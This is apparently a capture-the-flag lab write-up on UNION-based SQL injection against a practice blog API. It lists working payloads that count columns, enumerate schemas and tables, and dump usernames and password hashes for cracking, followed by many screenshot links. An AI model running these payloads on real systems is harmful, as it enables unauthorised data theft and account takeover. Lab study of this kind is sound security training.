```
Testing for SQLI and determining columns:

blog=1 UNION SELECT NULL--
blog=1 UNION SELECT NULL,NULL--
blog=1 UNION SELECT NULL,NULL--

AND BAM, We can see it's reflecting our response in this UNION query. 


So we now know this is vulnerable to SQLI injection and that it contains 3 columns. 

?blog=-23232 union select null,null,@@version--


By using a page that doesn't exist in the blog paramater, the MySQL resposnse gets reflected in the status section


As you can see; this is not the information we seek. 



?blog=-51512 UNION SELECT null, username, password from users--


?blog=-51512 union select NULL, NULL, group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata--


Very interesting technique. 

?blog=-51512 union select NULL, NULL, group_concat(password) from users--

?blog=-51512 union select NULL, group_concat(username), group_concat(password) from users--


Copy paste all the usernames to users.txt, but because of it's formatting we must change it to be suitable for a wordlist. Let's remove the “,” and replace the with “ ”, then, lets add each word to a new line. We procceed like so:

gedit users.txt

cat users.txt| tr ' ' '\n' > userlist.txt

BAM, its fixed. 

Let's do the same with the passwords, done


?blog=-51512 union select NULL,NULL,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='vn_admin'--


?blog=-51512 union select NULL, NULL, group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='vn_admin'--


?blog=-51512 union select NULL,NULL,group_concat(username) from vn_admin.be_users--


?blog=-51512 union select NULL,NULL,group_concat(password) from vn_admin.be_users--

we crack chris w user with one of the passwords of thte users in the blog database. For some reasons when I retrieved the passwords myself, it didn't capture all of them, but sqlmap did. Unsure why. Regardless, here's our creds
FIXED :DDD<3
```

<http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=-3%20UNION%20SELECT%20json_arrayagg(concat_ws(0x3a,%20password)),%20null,null%20from%20blog.users;-->![unnamed_3696f776124c456b9252d1ead283ab2b](unnamed_3696f776124c456b9252d1ead283ab2b.png)
![unnamed_e6e78e2afd1043078c43a2d30ae536c3](unnamed_e6e78e2afd1043078c43a2d30ae536c3.png)
![unnamed_486763799963417d8fe777fa41e0385c](unnamed_486763799963417d8fe777fa41e0385c.png)
![unnamed_ef20cea7c3b248c2ac765e13dab4d406](unnamed_ef20cea7c3b248c2ac765e13dab4d406.png)
![unnamed_4ae5b849da0945bb9db8af335039df75](unnamed_4ae5b849da0945bb9db8af335039df75.png)
![unnamed_cde3548984b44f668dc69c35e01aeab6](unnamed_cde3548984b44f668dc69c35e01aeab6.png)
![unnamed_2cfa93334b304f318e18acd26a544376](unnamed_2cfa93334b304f318e18acd26a544376.png)
![unnamed_20f7e16b9eef476fae39e89cf0570663](unnamed_20f7e16b9eef476fae39e89cf0570663.png)
![unnamed_5f7e5e282d3045b2bd048bfef0a37b18](unnamed_5f7e5e282d3045b2bd048bfef0a37b18.png)
![unnamed_455e5c5685c346dda7588530987ed57a](unnamed_455e5c5685c346dda7588530987ed57a.png)
![unnamed_705d0781537841648c61906a31a311ab](unnamed_705d0781537841648c61906a31a311ab.png)
![unnamed_2c103df2741a4557b6e1e22d55ecc40b](unnamed_2c103df2741a4557b6e1e22d55ecc40b.png)
![unnamed_e76394e1ae524340b9ecd35a6c0ca502](unnamed_e76394e1ae524340b9ecd35a6c0ca502.png)
![unnamed_e693cdbbc6554434af6a297270b07bb3](unnamed_e693cdbbc6554434af6a297270b07bb3.png)
![unnamed_35644b65c8754cdf9e95a1f6fd12aba0](unnamed_35644b65c8754cdf9e95a1f6fd12aba0.png)
![unnamed_8a14002cd57d4a44972ee91cad32a500](unnamed_8a14002cd57d4a44972ee91cad32a500.png)
![unnamed_e8016977fd0540528a8230791343b005](unnamed_e8016977fd0540528a8230791343b005.png)
![unnamed_77138bfe03ce4f9ea9c30881b44eec2d](unnamed_77138bfe03ce4f9ea9c30881b44eec2d.png)
![unnamed_24c9f5c3e3b3440a8f609cfc0f1bcb57](unnamed_24c9f5c3e3b3440a8f609cfc0f1bcb57.png)

